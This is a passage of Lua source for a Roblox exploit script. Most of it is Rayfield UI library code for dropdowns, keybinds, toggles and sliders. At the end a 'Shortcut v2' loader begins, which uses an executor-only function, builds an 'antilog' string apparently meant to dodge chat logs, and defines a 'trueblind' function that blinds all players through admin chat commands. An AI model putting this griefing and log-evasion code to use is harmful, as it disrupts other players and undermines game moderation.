						TweenService:Create(Dropdown, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
						TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						Dropdown.Title.Text = "Callback Error"
						print("Rayfield | "..DropdownSettings.Name.." Callback Error " ..tostring(Response))
						wait(0.5)
						Dropdown.Title.Text = DropdownSettings.Name
						TweenService:Create(Dropdown, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end

					for _, droption in ipairs(Dropdown.List:GetChildren()) do
						if droption.ClassName == "Frame" and droption.Name ~= "Placeholder" then
							if not table.find(DropdownSettings.CurrentOption, droption.Name) then
								droption.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
							else
								droption.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
							end
						end
					end
					--SaveConfiguration()
				end

				if Settings.ConfigurationSaving then
					if Settings.ConfigurationSaving.Enabled and DropdownSettings.Flag then
						RayfieldLibrary.Flags[DropdownSettings.Flag] = DropdownSettings
					end
				end

				return DropdownSettings
			end

			-- Keybind
			function Tab:CreateKeybind(KeybindSettings)
				local CheckingForKey = false
				local Keybind = Elements.Template.Keybind:Clone()
				Keybind.Name = KeybindSettings.Name
				Keybind.Title.Text = KeybindSettings.Name
				Keybind.Visible = true
				Keybind.Parent = TabPage

				Keybind.BackgroundTransparency = 1
				Keybind.UIStroke.Transparency = 1
				Keybind.Title.TextTransparency = 1

				Keybind.KeybindFrame.BackgroundColor3 = SelectedTheme.InputBackground
				Keybind.KeybindFrame.UIStroke.Color = SelectedTheme.InputStroke

				TweenService:Create(Keybind, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Keybind.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Keybind.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				Keybind.KeybindFrame.KeybindBox.Text = KeybindSettings.CurrentKeybind
				Keybind.KeybindFrame.Size = UDim2.new(0, Keybind.KeybindFrame.KeybindBox.TextBounds.X + 24, 0, 30)

				Keybind.KeybindFrame.KeybindBox.Focused:Connect(function()
					CheckingForKey = true
					Keybind.KeybindFrame.KeybindBox.Text = ""
				end)
				Keybind.KeybindFrame.KeybindBox.FocusLost:Connect(function()
					CheckingForKey = false
					if Keybind.KeybindFrame.KeybindBox.Text == nil or "" then
						Keybind.KeybindFrame.KeybindBox.Text = KeybindSettings.CurrentKeybind
						SaveConfiguration()
					end
				end)

				Keybind.MouseEnter:Connect(function()
					TweenService:Create(Keybind, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
				end)

				Keybind.MouseLeave:Connect(function()
					TweenService:Create(Keybind, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
				end)

				UserInputService.InputBegan:Connect(function(input, processed)

					if CheckingForKey then
						if input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode ~= Enum.KeyCode.N then
							local SplitMessage = string.split(tostring(input.KeyCode), ".")
							local NewKeyNoEnum = SplitMessage[3]
							Keybind.KeybindFrame.KeybindBox.Text = tostring(NewKeyNoEnum)
							KeybindSettings.CurrentKeybind = tostring(NewKeyNoEnum)
							Keybind.KeybindFrame.KeybindBox:ReleaseFocus()
							SaveConfiguration()
						end
					elseif KeybindSettings.CurrentKeybind ~= nil and (input.KeyCode == Enum.KeyCode[KeybindSettings.CurrentKeybind] and not processed) then -- Test
						local Held = true
						local Connection
						Connection = input.Changed:Connect(function(prop)
							if prop == "UserInputState" then
								Connection:Disconnect()
								Held = false
							end
						end)

						if not KeybindSettings.HoldToInteract then
							local Success, Response = pcall(KeybindSettings.Callback)
							if not Success then
								TweenService:Create(Keybind, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
								TweenService:Create(Keybind.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
								Keybind.Title.Text = "Callback Error"
								print("Rayfield | "..KeybindSettings.Name.." Callback Error " ..tostring(Response))
								wait(0.5)
								Keybind.Title.Text = KeybindSettings.Name
								TweenService:Create(Keybind, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
								TweenService:Create(Keybind.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
							end
						else
							wait(0.25)
							if Held then
								local Loop; Loop = RunService.Stepped:Connect(function()
									if not Held then
										KeybindSettings.Callback(false) -- maybe pcall this
										Loop:Disconnect()
									else
										KeybindSettings.Callback(true) -- maybe pcall this
									end
								end)	
							end
						end
					end
				end)

				Keybind.KeybindFrame.KeybindBox:GetPropertyChangedSignal("Text"):Connect(function()
					TweenService:Create(Keybind.KeybindFrame, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, Keybind.KeybindFrame.KeybindBox.TextBounds.X + 24, 0, 30)}):Play()
				end)

				function KeybindSettings:Set(NewKeybind)
					Keybind.KeybindFrame.KeybindBox.Text = tostring(NewKeybind)
					KeybindSettings.CurrentKeybind = tostring(NewKeybind)
					Keybind.KeybindFrame.KeybindBox:ReleaseFocus()
					SaveConfiguration()
				end
				if Settings.ConfigurationSaving then
					if Settings.ConfigurationSaving.Enabled and KeybindSettings.Flag then
						RayfieldLibrary.Flags[KeybindSettings.Flag] = KeybindSettings
					end
				end
				return KeybindSettings
			end

			-- Toggle
			function Tab:CreateToggle(ToggleSettings)
				local ToggleValue = {}

				local Toggle = Elements.Template.Toggle:Clone()
				Toggle.Name = ToggleSettings.Name
				Toggle.Title.Text = ToggleSettings.Name
				Toggle.Visible = true
				Toggle.Parent = TabPage

				Toggle.BackgroundTransparency = 1
				Toggle.UIStroke.Transparency = 1
				Toggle.Title.TextTransparency = 1
				Toggle.Switch.BackgroundColor3 = SelectedTheme.ToggleBackground

				if SelectedTheme ~= RayfieldLibrary.Theme.Default then
					Toggle.Switch.Shadow.Visible = false
				end

				TweenService:Create(Toggle, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Toggle.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				if not ToggleSettings.CurrentValue then
					Toggle.Switch.Indicator.Position = UDim2.new(1, -40, 0.5, 0)
					Toggle.Switch.Indicator.UIStroke.Color = SelectedTheme.ToggleDisabledStroke
					Toggle.Switch.Indicator.BackgroundColor3 = SelectedTheme.ToggleDisabled
					Toggle.Switch.UIStroke.Color = SelectedTheme.ToggleDisabledOuterStroke
				else
					Toggle.Switch.Indicator.Position = UDim2.new(1, -20, 0.5, 0)
					Toggle.Switch.Indicator.UIStroke.Color = SelectedTheme.ToggleEnabledStroke
					Toggle.Switch.Indicator.BackgroundColor3 = SelectedTheme.ToggleEnabled
					Toggle.Switch.UIStroke.Color = SelectedTheme.ToggleEnabledOuterStroke
				end

				Toggle.MouseEnter:Connect(function()
					TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
				end)

				Toggle.MouseLeave:Connect(function()
					TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
				end)

				Toggle.Interact.MouseButton1Click:Connect(function()
					if ToggleSettings.CurrentValue then
						ToggleSettings.CurrentValue = false
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(1, -40, 0.5, 0)}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,12,0,12)}):Play()
						TweenService:Create(Toggle.Switch.Indicator.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = SelectedTheme.ToggleDisabledStroke}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = SelectedTheme.ToggleDisabled}):Play()
						TweenService:Create(Toggle.Switch.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = SelectedTheme.ToggleDisabledOuterStroke}):Play()
						wait(0.05)
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,17,0,17)}):Play()
						wait(0.15)
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()	
					else
						ToggleSettings.CurrentValue = true
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(1, -20, 0.5, 0)}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,12,0,12)}):Play()
						TweenService:Create(Toggle.Switch.Indicator.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = SelectedTheme.ToggleEnabledStroke}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = SelectedTheme.ToggleEnabled}):Play()
						TweenService:Create(Toggle.Switch.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = SelectedTheme.ToggleEnabledOuterStroke}):Play()
						wait(0.05)
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,17,0,17)}):Play()	
						wait(0.15)
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()		
					end

					local Success, Response = pcall(function()
						ToggleSettings.Callback(ToggleSettings.CurrentValue)
					end)
					if not Success then
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						Toggle.Title.Text = "Callback Error"
						print("Rayfield | "..ToggleSettings.Name.." Callback Error " ..tostring(Response))
						wait(0.5)
						Toggle.Title.Text = ToggleSettings.Name
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end


					SaveConfiguration()
				end)

				function ToggleSettings:Set(NewToggleValue)
					if NewToggleValue then
						ToggleSettings.CurrentValue = true
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(1, -20, 0.5, 0)}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,12,0,12)}):Play()
						TweenService:Create(Toggle.Switch.Indicator.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = SelectedTheme.ToggleEnabledStroke}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = SelectedTheme.ToggleEnabled}):Play()
						TweenService:Create(Toggle.Switch.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = Color3.fromRGB(100,100,100)}):Play()
						wait(0.05)
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,17,0,17)}):Play()	
						wait(0.15)
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()	
					else
						ToggleSettings.CurrentValue = false
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(1, -40, 0.5, 0)}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,12,0,12)}):Play()
						TweenService:Create(Toggle.Switch.Indicator.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = SelectedTheme.ToggleDisabledStroke}):Play()
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = SelectedTheme.ToggleDisabled}):Play()
						TweenService:Create(Toggle.Switch.UIStroke, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = Color3.fromRGB(65,65,65)}):Play()
						wait(0.05)
						TweenService:Create(Toggle.Switch.Indicator, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0,17,0,17)}):Play()
						wait(0.15)
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()	
					end
					local Success, Response = pcall(function()
						ToggleSettings.Callback(ToggleSettings.CurrentValue)
					end)
					if not Success then
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						Toggle.Title.Text = "Callback Error"
						print("Rayfield | "..ToggleSettings.Name.." Callback Error " ..tostring(Response))
						wait(0.5)
						Toggle.Title.Text = ToggleSettings.Name
						TweenService:Create(Toggle, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Toggle.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end
					SaveConfiguration()
				end

				if Settings.ConfigurationSaving then
					if Settings.ConfigurationSaving.Enabled and ToggleSettings.Flag then
						RayfieldLibrary.Flags[ToggleSettings.Flag] = ToggleSettings
					end
				end

				return ToggleSettings
			end

			-- Slider
			function Tab:CreateSlider(SliderSettings)
				local Dragging = false
				local Slider = Elements.Template.Slider:Clone()
				Slider.Name = SliderSettings.Name
				Slider.Title.Text = SliderSettings.Name
				Slider.Visible = true
				Slider.Parent = TabPage

				Slider.BackgroundTransparency = 1
				Slider.UIStroke.Transparency = 1
				Slider.Title.TextTransparency = 1

				if SelectedTheme ~= RayfieldLibrary.Theme.Default then
					Slider.Main.Shadow.Visible = false
				end

				Slider.Main.BackgroundColor3 = SelectedTheme.SliderBackground
				Slider.Main.UIStroke.Color = SelectedTheme.SliderStroke
				Slider.Main.Progress.BackgroundColor3 = SelectedTheme.SliderProgress

				TweenService:Create(Slider, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Slider.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Slider.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				Slider.Main.Progress.Size =	UDim2.new(0, Slider.Main.AbsoluteSize.X * ((SliderSettings.CurrentValue + SliderSettings.Range[1]) / (SliderSettings.Range[2] - SliderSettings.Range[1])) > 5 and Slider.Main.AbsoluteSize.X * (SliderSettings.CurrentValue / (SliderSettings.Range[2] - SliderSettings.Range[1])) or 5, 1, 0)

				if not SliderSettings.Suffix then
					Slider.Main.Information.Text = tostring(SliderSettings.CurrentValue)
				else
					Slider.Main.Information.Text = tostring(SliderSettings.CurrentValue) .. " " .. SliderSettings.Suffix
				end


				Slider.MouseEnter:Connect(function()
					TweenService:Create(Slider, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
				end)

				Slider.MouseLeave:Connect(function()
					TweenService:Create(Slider, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
				end)

				Slider.Main.Interact.InputBegan:Connect(function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
						Dragging = true 
					end 
				end)
				Slider.Main.Interact.InputEnded:Connect(function(Input) 
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
						Dragging = false 
					end 
				end)

				Slider.Main.Interact.MouseButton1Down:Connect(function(X)
					local Current = Slider.Main.Progress.AbsolutePosition.X + Slider.Main.Progress.AbsoluteSize.X
					local Start = Current
					local Location = X
					local Loop; Loop = RunService.Stepped:Connect(function()
						if Dragging then
							Location = UserInputService:GetMouseLocation().X
							Current = Current + 0.025 * (Location - Start)

							if Location < Slider.Main.AbsolutePosition.X then
								Location = Slider.Main.AbsolutePosition.X
							elseif Location > Slider.Main.AbsolutePosition.X + Slider.Main.AbsoluteSize.X then
								Location = Slider.Main.AbsolutePosition.X + Slider.Main.AbsoluteSize.X
							end

							if Current < Slider.Main.AbsolutePosition.X + 5 then
								Current = Slider.Main.AbsolutePosition.X + 5
							elseif Current > Slider.Main.AbsolutePosition.X + Slider.Main.AbsoluteSize.X then
								Current = Slider.Main.AbsolutePosition.X + Slider.Main.AbsoluteSize.X
							end

							if Current <= Location and (Location - Start) < 0 then
								Start = Location
							elseif Current >= Location and (Location - Start) > 0 then
								Start = Location
							end
							TweenService:Create(Slider.Main.Progress, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, Current - Slider.Main.AbsolutePosition.X, 1, 0)}):Play()
							local NewValue = SliderSettings.Range[1] + (Location - Slider.Main.AbsolutePosition.X) / Slider.Main.AbsoluteSize.X * (SliderSettings.Range[2] - SliderSettings.Range[1])

							NewValue = math.floor(NewValue / SliderSettings.Increment + 0.5) * (SliderSettings.Increment * 10000000) / 10000000
							if not SliderSettings.Suffix then
								Slider.Main.Information.Text = tostring(NewValue)
							else
								Slider.Main.Information.Text = tostring(NewValue) .. " " .. SliderSettings.Suffix
							end

							if SliderSettings.CurrentValue ~= NewValue then
								local Success, Response = pcall(function()
									SliderSettings.Callback(NewValue)
								end)
								if not Success then
									TweenService:Create(Slider, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
									TweenService:Create(Slider.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
									Slider.Title.Text = "Callback Error"
									print("Rayfield | "..SliderSettings.Name.." Callback Error " ..tostring(Response))
									wait(0.5)
									Slider.Title.Text = SliderSettings.Name
									TweenService:Create(Slider, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
									TweenService:Create(Slider.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
								end

								SliderSettings.CurrentValue = NewValue
								SaveConfiguration()
							end
						else
							TweenService:Create(Slider.Main.Progress, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, Location - Slider.Main.AbsolutePosition.X > 5 and Location - Slider.Main.AbsolutePosition.X or 5, 1, 0)}):Play()
							Loop:Disconnect()
						end
					end)
				end)

				function SliderSettings:Set(NewVal)
					TweenService:Create(Slider.Main.Progress, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, Slider.Main.AbsoluteSize.X * ((NewVal + SliderSettings.Range[1]) / (SliderSettings.Range[2] - SliderSettings.Range[1])) > 5 and Slider.Main.AbsoluteSize.X * (NewVal / (SliderSettings.Range[2] - SliderSettings.Range[1])) or 5, 1, 0)}):Play()
					Slider.Main.Information.Text = tostring(NewVal) .. " " .. SliderSettings.Suffix
					local Success, Response = pcall(function()
						SliderSettings.Callback(NewVal)
					end)
					if not Success then
						TweenService:Create(Slider, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
						TweenService:Create(Slider.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						Slider.Title.Text = "Callback Error"
						print("Rayfield | "..SliderSettings.Name.." Callback Error " ..tostring(Response))
						wait(0.5)
						Slider.Title.Text = SliderSettings.Name
						TweenService:Create(Slider, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Slider.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end
					SliderSettings.CurrentValue = NewVal
					SaveConfiguration()
				end
				if Settings.ConfigurationSaving then
					if Settings.ConfigurationSaving.Enabled and SliderSettings.Flag then
						RayfieldLibrary.Flags[SliderSettings.Flag] = SliderSettings
					end
				end
				return SliderSettings
			end


			return Tab
		end

		Elements.Visible = true

		wait(0.7)
		TweenService:Create(LoadingFrame.Title, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
		TweenService:Create(LoadingFrame.Subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
		TweenService:Create(LoadingFrame.Version, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
		wait(0.2)
		TweenService:Create(Main, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 475)}):Play()
		TweenService:Create(Main.Shadow.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.4}):Play()

		Topbar.BackgroundTransparency = 1
		Topbar.Divider.Size = UDim2.new(0, 0, 0, 1)
		Topbar.CornerRepair.BackgroundTransparency = 1
		Topbar.Title.TextTransparency = 1
		Topbar.Theme.ImageTransparency = 1
		Topbar.ChangeSize.ImageTransparency = 1
		Topbar.Hide.ImageTransparency = 1

		wait(0.5)
		Topbar.Visible = true
		TweenService:Create(Topbar, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Topbar.CornerRepair, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		wait(0.1)
		TweenService:Create(Topbar.Divider, TweenInfo.new(1, Enum.EasingStyle.Quint), {Size = UDim2.new(1, 0, 0, 1)}):Play()
		wait(0.1)
		TweenService:Create(Topbar.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
		wait(0.1)
		TweenService:Create(Topbar.Theme, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.8}):Play()
		wait(0.1)
		TweenService:Create(Topbar.ChangeSize, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.8}):Play()
		wait(0.1)
		TweenService:Create(Topbar.Hide, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.8}):Play()
		wait(0.3)

		return Window
	end


	function RayfieldLibrary:Destroy()
		Rayfield:Destroy()
	end

	Topbar.ChangeSize.MouseButton1Click:Connect(function()
		if Debounce then return end
		if Minimised then
			Minimised = false
			Maximise()
		else
			Minimised = true
			Minimise()
		end
	end)

	Topbar.Hide.MouseButton1Click:Connect(function()
		if Debounce then return end
		if Hidden then
			Hidden = false
			Minimised = false
			Unhide()
		else
			Hidden = true
			Hide()
		end
	end)

	UserInputService.InputBegan:Connect(function(input, processed)
		if (input.KeyCode == Enum.KeyCode.N and not processed) then
			if Debounce then return end
			if Hidden then
				Hidden = false
				Unhide()
			else
				Hidden = true
				Hide()
			end
		end
	end)

	for _, TopbarButton in ipairs(Topbar:GetChildren()) do
		if TopbarButton.ClassName == "ImageButton" then
			TopbarButton.MouseEnter:Connect(function()
				TweenService:Create(TopbarButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
			end)

			TopbarButton.MouseLeave:Connect(function()
				TweenService:Create(TopbarButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.8}):Play()
			end)

			TopbarButton.MouseButton1Click:Connect(function()
				TweenService:Create(TopbarButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.8}):Play()
			end)
		end
	end


	return RayfieldLibrary
end

function mod:LoadShortcut()

	repeat task.wait() until game:IsLoaded()
	print("SHORTCUT V2")
	function logn(message) -- Totally skidded, amirite Temmie
		game.StarterGui:SetCore("SendNotification",
			{
				Title = "NEW Shortcut v2",
				Text = message,
				Duration = 5.5
			})
	end

	local connections = {}

	local gameFlr = workspace.Terrain._Game
	local adminFlr = gameFlr.Admin

	local soundvis = false

	-- services
	local rns = game:GetService("RunService")
	local tps = game:GetService("TeleportService")
	local http = game:GetService("HttpService")
	local ws = game:GetService("Workspace")
	local plyrs = game:GetService("Players")
	local uis = game:GetService("UserInputService")

	shared.gpcheck = true

	shared.banana = {} -- For non-perms


	local screenGui = Instance.new("ScreenGui")
	screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

	_G.antiseiz = true
	local Stable_Check = false
	local rotation = Instance.new("BodyGyro")
	local plrs = game:GetService("Players") -- I know they're like two of those but I imported this
	local getplrs = plrs:GetChildren()
	local plr = plrs.LocalPlayer
	local mousee = game.Players.LocalPlayer:GetMouse()
	local GC = getconnections or get_signal_cons
	local Character = plr.Character or plr.CharacterAdded
	local hum = Character:WaitForChild("Humanoid")
	local Plrname = plr.Name
	local userId = game.Players.LocalPlayer.UserId
	_G.house_keybind = "n"
	_G.reset_keybind = "c" -- This also shares with VAR
	_G.scriptrunning = true -- Do not touch this please, for the love of god

	local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
	local Workspace_Folder = Game_Folder.Workspace

	local customcmdstable = {}



	local function chatt(ch)
		workspace.ChatWindow_MessagePosted:fire(ch)
	end

	local antilog = string.rep(0, math.random(16, 100))

	local Utils = {
		Task = {}
	}

	local function trueblind()
		chatt(":blind all")
		chatt("fogcolor 0 0 0")
		chatt("fogend nil")
		chatt("brightness nan")
		chatt("time -")
	end

	local sg = game:GetService("StarterGui")

	function Utils.Task:wait(duration)
		if duration == nil or duration <= 0 then
			duration = 1
		end

		local measure = os.clock()
		duration = duration * 0.001

		repeat delta = task.wait() until os.clock() + delta >= measure + duration

		repeat if true then end until measure + duration <= os.clock()
		-- Simplified
	end

	function Utils:__wait()
		rns.Heartbeat:Wait()
	end
	function Utils.getPlr(str)
		local myInput = string.lower(str)
		for i,v in ipairs(plyrs:GetPlayers()) do
			if string.sub(string.lower(v.Character.Name), 1, #myInput) == myInput then 
				return v.Character.Name
			end
		end
	end

	function Utils.ejectGUI()
